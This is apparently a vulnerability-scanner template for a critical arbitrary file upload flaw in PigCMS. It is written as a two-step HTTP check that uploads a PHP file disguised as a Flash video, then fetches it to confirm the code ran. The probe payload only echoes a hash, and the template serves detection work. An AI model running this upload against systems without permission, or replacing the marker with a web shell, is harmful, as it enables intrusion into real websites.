@@ -1,0 +1,56 @@
+id: PigCMS-action_flashUpload-arbitrary-upload
+
+info:
+  name: PigCMS action_flashUpload Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  boundary: "{{rand_text_alphanumeric(8)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step1
+    method: POST
+    path:
+      - "/cms/manage/admin.php?m=manage&c=background&a=action_flashUpload"
+    headers:
+      Content-Type: "multipart/form-data; boundary={{boundary}}"
+    body: |
+      --{{boundary}}
+      Content-Disposition: form-data; name="filePath"; filename="test.php"
+      Content-Type: video/x-flv
+
+      <?php echo md5("{{boundary}}"); ?>
+      --{{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "MAIN_URL_ROOT/upload/images/"
+    extractors:
+      - type: regex
+        name: fpath
+        group: 1
+        regex:
+          - "MAIN_URL_ROOT(?P<fpath>.+)"
+
+  - id: step2
+    method: GET
+    path:
+      - "/cms{{fpath}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{md5(boundary)}}"
